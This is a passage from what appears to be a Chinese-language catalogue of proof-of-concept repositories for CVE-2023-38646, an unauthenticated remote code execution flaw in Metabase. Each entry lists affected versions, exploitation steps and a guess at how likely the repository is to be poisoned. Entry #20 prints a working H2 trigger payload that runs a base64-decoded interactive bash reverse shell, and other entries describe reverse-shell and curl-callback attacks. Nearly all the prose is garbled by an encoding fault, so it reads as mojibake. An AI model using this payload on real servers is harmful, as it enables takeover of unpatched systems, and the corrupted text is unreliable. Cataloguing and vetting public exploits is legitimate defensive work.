è¯¥æ¼æ´åˆ©ç”¨ä»£ç é¦–å…ˆè·å–Metabaseçš„`setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªæ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œé€šè¿‡`TRACE_LEVEL_SYSTEM_OUT`å’Œ`CREATE TRIGGER`æœºåˆ¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç æ¥ç»•è¿‡ä¸€äº›è¿‡æ»¤ï¼Œå¹¶åœ¨payloadä¸­éšæœºç”Ÿæˆå­—ç¬¦ä¸²æ¥é¿å…ç¼“å­˜ç­‰é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¹¶æ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ä»£ç çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´è¿›è¡Œåå¼¹shellï¼Œè™½ç„¶åå¼¹shellæœ¬èº«å…·æœ‰ä¸€å®šçš„é£é™©ï¼Œä½†è¿™æ˜¯æ¼æ´åˆ©ç”¨çš„æ­£å¸¸è¡Œä¸ºï¼Œä¸åº”è§†ä¸ºæŠ•æ¯’ã€‚`README.md`æ–‡ä»¶ä¹Ÿæ²¡æœ‰ä»»ä½•å¯ç–‘ä¹‹å¤„ã€‚å¯ä»¥åˆ¤æ–­æ­¤ä»“åº“ä¸­ä½œè€…éšè—æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§å¾ˆä½ï¼Œæ¦‚ç‡ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [birdm4nw/CVE-2023-38646](https://github.com/birdm4nw/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #20

**æ¥æº**: [CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md](../2023/CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»æˆæƒçš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå­˜åœ¨æ¼æ´çš„Metabaseç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ¼æ´å­˜åœ¨äº Metabase çš„è®¾ç½®æµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒé€šè¿‡ä»¥ä¸‹æ­¥éª¤åˆ©ç”¨æ¼æ´ï¼š
1.  è·å– setup-token, ç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  æ„é€ åŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ POST è¯·æ±‚ï¼Œå‘é€åˆ° /api/setup/validate æ¥å£ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª SQL è§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® INFORMATION_SCHEMA.TABLES æ—¶æ‰§è¡Œä»»æ„çš„ base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  æ‰§è¡Œçš„å‘½ä»¤æ˜¯åå¼¹shellï¼Œå°†ç›®æ ‡æœåŠ¡å™¨çš„ shell é‡å®šå‘åˆ°æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚

**æŠ•æ¯’é£é™©ï¼š**
ä»“åº“ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚ä¸»è¦é£é™©æ¥è‡ªäºï¼š
1.  `add_padding`å‡½æ•°ï¼šè¿™ä¸ªå‡½æ•°çœ‹ä¼¼æ˜¯ä¸ºäº†æ¶ˆé™¤ base64 ç¼–ç åçš„ç­‰å·ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æ­¤å‡½æ•°æ¥æ’å…¥æ¶æ„ä»£ç ï¼Œè™½ç„¶å½“å‰çš„ç›®çš„æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›è¿‡æ»¤æœºåˆ¶ï¼Œä½†å­˜åœ¨è¢«æ»¥ç”¨çš„é£é™©ï¼Œé€šè¿‡ä¿®æ”¹payloadæ„é€ è¿‡ç¨‹æ¤å…¥æ¶æ„ä»£ç ã€‚
2.  åå¼¹ Shell çš„IPå’Œç«¯å£æ˜¯ç”¨æˆ·æŒ‡å®šçš„ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…æ— æ³•é€šè¿‡ç›´æ¥ä¿®æ”¹ä»£ç æ¥æ¤å…¥åé—¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **æ¼æ´å®šä½ï¼š** æ¼æ´å­˜åœ¨äºMetabaseçš„å®‰è£…è®¾ç½®é˜¶æ®µï¼Œå…·ä½“ä½äº`api/setup/validate`æ¥å£ã€‚
2.  **è·å–Tokenï¼š** é€šè¿‡è®¿é—®`/api/session/properties`è·å–`setup-token`ï¼Œè¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚
3.  **æ„é€ Payloadï¼š**  æ ¸å¿ƒåœ¨äºæ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä»¥ä¸‹å…³é”®éƒ¨åˆ†ï¼š
    *   `zip:/app/metabase.jar!/sample-database.db`ï¼šæŒ‡å®šæ•°æ®åº“æ–‡ä»¶çš„ä½ç½®ã€‚
    *   `MODE=MSSQLServer`ï¼šè®¾ç½®æ•°æ®åº“æ¨¡å¼ä¸ºMSSQLServerï¼Œè¿™æ˜¯è§¦å‘æ¼æ´çš„å¿…è¦æ¡ä»¶ã€‚
    *   `TRACE_LEVEL_SYSTEM_OUT=1`ï¼šå¯ç”¨ç³»ç»Ÿè¾“å‡ºè·Ÿè¸ªã€‚
    *   `CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x`ï¼šåˆ›å»ºä¸€ä¸ªåä¸º`pwnshell`çš„è§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢`INFORMATION_SCHEMA.TABLES`è¡¨ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä½¿ç”¨ JavaScript è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œåå¼¹shellå‘½ä»¤ã€‚`{payload}`ä¼šè¢«æ›¿æ¢ä¸ºbase64ç¼–ç åçš„åå¼¹shellå‘½ä»¤ï¼Œå…¶ä¸­åˆ©ç”¨äº†bashçš„ç‰¹æ€§è¿›è¡Œè§£ç å’Œæ‰§è¡Œã€‚
4.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ å¥½çš„åŒ…å«payloadçš„JSONæ•°æ®ï¼Œé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`æ¥å£ã€‚
5.  **æ‰§è¡Œå‘½ä»¤ï¼š**  å½“Metabaseå°è¯•è¿æ¥åˆ°æ¶æ„æ„é€ çš„æ•°æ®åº“æ—¶ï¼Œè§¦å‘å™¨è¢«æ‰§è¡Œï¼Œä»è€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [j0yb0y0h/CVE-2023-38646](https://github.com/j0yb0y0h/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #21

**æ¥æº**: [CVE-2023-38646-junnythemarksman_CVE-2023-38646.md](../2023/CVE-2023-38646-junnythemarksman_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­å­˜åœ¨çš„ä¸€ä¸ªæ— éœ€è®¤è¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…é€šè¿‡å‘é€ç‰¹åˆ¶çš„ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨ `subname` å­—æ®µä¸­æ³¨å…¥æ¶æ„çš„ JDBC URLã€‚è¯¥URLåŒ…å«ä¸€ä¸ªCREATE TRIGGERè¯­å¥ï¼Œè¯¥è¯­å¥åœ¨INFORMATION_SCHEMA.TABLESè¡¨ä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æä¾›ä¸€ä¸ªåŒ…å«åå¼¹shellå‘½ä»¤çš„payloadï¼Œè¯¥å‘½ä»¤ä¼šè¢«base64ç¼–ç åæ‰§è¡Œã€‚æ¼æ´åˆ©ç”¨ä»£ç ä¸­çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¸»è¦æ˜¯é€šè¿‡ç¯¡æ”¹IPå’Œç«¯å£è¿›è¡Œæ¶æ„è¿æ¥ï¼Œå­˜åœ¨å°‘é‡é£é™©ã€‚ è„šæœ¬è¦æ±‚ç”¨æˆ·æŒ‡å®šç›®æ ‡ URL å’Œ tokenï¼Œ token é€šè¿‡ `/api/session/properties` è·å–ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  è·å–ç›®æ ‡ Metabase å®ä¾‹çš„ URL å’Œ tokenï¼ˆé€šè¿‡è®¿é—® `/api/session/properties` è·å–ï¼‰ã€‚
2.  é…ç½®æ¼æ´åˆ©ç”¨è„šæœ¬ `exploit.py`ï¼Œè®¾ç½®ç›®æ ‡ URLã€tokenã€æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚
3.  è¿è¡Œè„šæœ¬ï¼Œè„šæœ¬å°†å‘é€åŒ…å«æ¶æ„ JDBC URL çš„ POST è¯·æ±‚åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚
4.  ç›®æ ‡ Metabase å®ä¾‹æ‰§è¡Œæ¶æ„ä»£ç ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å’Œå‘é€æ¶æ„è¯·æ±‚ï¼Œè™½ç„¶å­˜åœ¨é€šè¿‡ä¿®æ”¹IPç«¯å£è¿›è¡Œæ¶æ„è¿æ¥çš„é£é™©ï¼Œ ä½†æ˜¯éœ€è¦ä½¿ç”¨è€…è‡ªè¡Œé…ç½®ã€‚æ‰€ä»¥æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [junnythemarksman/CVE-2023-38646](https://github.com/junnythemarksman/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #22

**æ¥æº**: [CVE-2023-38646-kh4sh3i_CVE-2023-38646.md](../2023/CVE-2023-38646-kh4sh3i_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseçš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå­˜åœ¨äº0.46.6.1ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ1.46.6.1ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ä¸­ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„HTTPè¯·æ±‚åˆ°/api/setup/validateç«¯ç‚¹ï¼Œå…¶ä¸­åŒ…å«æ¶æ„æ„é€ çš„JSON payloadã€‚è¯¥payloadåˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE ALIAS`è¯­å¥åˆ›å»ºä¸€ä¸ªåä¸º`SHELLEXEC`çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚PoCä»£ç é€šè¿‡curlå‘½ä»¤å›è¿æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ŒéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚è™½ç„¶POCä¸­ä½¿ç”¨äº†curlè¿›è¡Œå›è¿ï¼Œä½†æ”»å‡»è€…å¯ä»¥æ›¿æ¢æˆä»»ä½•å‘½ä»¤è¿›è¡Œæ¶æ„åˆ©ç”¨ã€‚æŠ•æ¯’é£é™©è¾ƒä½ï¼Œåªæœ‰æå°çš„å¯èƒ½æ€§ä½œè€…åœ¨ä»£ç ä¸­æ¤å…¥å…¶ä»–æ¶æ„ä»£ç ï¼ˆæ¯”å¦‚åœ¨LICENSEæ–‡ä»¶ä¸­éšè—ä¸å¯è§å­—ç¬¦ï¼‰ï¼Œä½†è¿™å¯ä»¥é€šè¿‡ä»”ç»†å®¡æŸ¥ä»£ç æ¥é¿å…ã€‚PoCä»£ç ä¸»è¦é€šè¿‡H2æ•°æ®åº“çš„ç‰¹æ€§æ‰§è¡Œä»»æ„ä»£ç ï¼ŒLICENSEæ–‡ä»¶ä¸»è¦å£°æ˜äº†ç‰ˆæƒåè®®ã€‚

**é¡¹ç›®åœ°å€:** [kh4sh3i/CVE-2023-38646](https://github.com/kh4sh3i/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #23

**æ¥æº**: [CVE-2023-38646-nickswink_CVE-2023-38646.md](../2023/CVE-2023-38646-nickswink_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚å¤šä¸ªèµ„æºç¡®è®¤äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œä¸¥é‡æ€§ã€‚

æä¾›çš„ PoC ä»£ç  `exploit.py` å°è¯•åˆ©ç”¨æ­¤æ¼æ´ã€‚å®ƒé¦–å…ˆè·å– Metabase å®ä¾‹çš„ `setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚Payloadä½¿ç”¨base64ç¼–ç åå¼¹shellå‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š**  PoC è„šæœ¬é¦–å…ˆå‘ç›®æ ‡ Metabase å®ä¾‹çš„ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œè§£æè¿”å›çš„ JSON æ•°æ®ä»¥æå– `setup-token`ã€‚æ­¤ token ç”¨äºåç»­çš„æ¼æ´åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š**  è¯¥è„šæœ¬æ„é€ ä¸€ä¸ª JSON payloadï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT=1` å’Œ `CREATE TRIGGER` ç­‰ H2 ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  **å‘é€ Payloadï¼š**  è„šæœ¬å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚æˆåŠŸåˆ©ç”¨åï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ payload ä¸­çš„å‘½ä»¤ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…çš„æœºå™¨ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

PoC ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå¹¶æ— æ˜æ˜¾çš„æ¶æ„æŠ•æ¯’ä»£ç ï¼Œä½†æ˜¯ä»å­˜åœ¨ä¸€å®šçš„é£é™©, å› ä¸ºPoC æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡Œä»»æ„ä»£ç ï¼Œæ”»å‡»è€…å¯ä»¥æ›¿æ¢åå¼¹shellçš„payloadä¸ºæ¶æ„payload,ä¾‹å¦‚åˆ é™¤æœåŠ¡å™¨æ•°æ®ï¼Œå› æ­¤æŠ•æ¯’é£é™©å­˜åœ¨ï¼Œé¢„ä¼°æ¯”ä¾‹ä¸º5%ã€‚æ­¤è¯„ä¼°åŸºäºä»£ç æœ¬èº«ï¼Œä¸åŒ…æ‹¬ä»£ç æ‰˜ç®¡å¹³å°å¯èƒ½å­˜åœ¨çš„é£é™©ï¼Œå¦‚è´¦å·è¢«ç›—ç­‰ã€‚

**é¡¹ç›®åœ°å€:** [nickswink/CVE-2023-38646](https://github.com/nickswink/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #24

**æ¥æº**: [CVE-2023-38646-passwa11_CVE-2023-38646.md](../2023/CVE-2023-38646-passwa11_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªæˆæƒçš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1, < 1.46.6.1 (åŠå…¶ä»–ä¿®å¤ç‰ˆæœ¬è§æ¼æ´åº“ä¿¡æ¯)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚ä¿®å¤ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆé€šè¿‡è®¿é—® `/api/session/properties` ç«¯ç‚¹è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å‘½ä»¤çš„ JSON payloadã€‚è¯¥ payload åˆ©ç”¨ H2 æ•°æ®åº“çš„ä¸€ä¸ªç‰¹æ€§ï¼Œé€šè¿‡åˆ›å»ºè§¦å‘å™¨åœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚è¯¥ JavaScript ä»£ç ä¼šæ‰§è¡Œ bash å‘½ä»¤ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **å‘é€ Payloadï¼š** æ”»å‡»è€…å°†æ„é€ çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚åˆ©ç”¨ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç ï¼Œç»•è¿‡æ£€æµ‹ã€‚

**POC ä»£ç æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ POC ä»£ç ä¼¼ä¹æœ‰æ•ˆï¼Œå› ä¸ºå®ƒå®ç°äº†ä¸Šè¿°åˆ©ç”¨è¿‡ç¨‹ã€‚å®ƒé¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªåŒ…å«åå‘ shell å‘½ä»¤çš„ payloadï¼Œå¹¶å°†å…¶å‘é€åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥å­˜å‚¨åº“çš„ä¸»è¦ä»£ç æ–‡ä»¶æ˜¯ `exploit.py`ã€‚ä»”ç»†æ£€æŸ¥æ­¤æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨ CVE-2023-38646 æ¼æ´ï¼Œå…è®¸è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ ä½†æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«å°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä½œè€…å¦‚æœå°†åå¼¹shellçš„IPæˆ–è€…ç«¯å£å†™æ­»ï¼Œå°±æœ‰å¯èƒ½è¢«ä½œè€…æ§åˆ¶ã€‚
`README.md` æ–‡ä»¶ä»…åŒ…å«æœ‰å…³æ¼æ´å’Œä½¿ç”¨è„šæœ¬çš„è¯´æ˜ã€‚å®ƒè¿˜åŒ…å«å¯¹åŸå§‹æ¼æ´å‘ç°å’Œç›¸å…³æ¼æ´åˆ©ç”¨çš„ credit é“¾æ¥ï¼Œè¿™è¡¨æ˜ä½œè€…æ²¡æœ‰è¯•å›¾éšè—è„šæœ¬çš„ç›®çš„ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [passwa11/CVE-2023-38646](https://github.com/passwa11/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #25

**æ¥æº**: [CVE-2023-38646-securezeron_CVE-2023-38646.md](../2023/CVE-2023-38646-securezeron_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** ç¬¬ä¸€ä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-POC.py`ï¼‰ç”¨äºè·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚å®ƒå°è¯•é€šè¿‡HTTPå’ŒHTTPSè¿æ¥åˆ°ç›®æ ‡IPåœ°å€ï¼Œå¹¶è¯·æ±‚`/api/session/properties`ç«¯ç‚¹ï¼Œè§£æè¿”å›çš„JSONæ•°æ®ï¼Œä»ä¸­æå–`setup-token`ã€‚
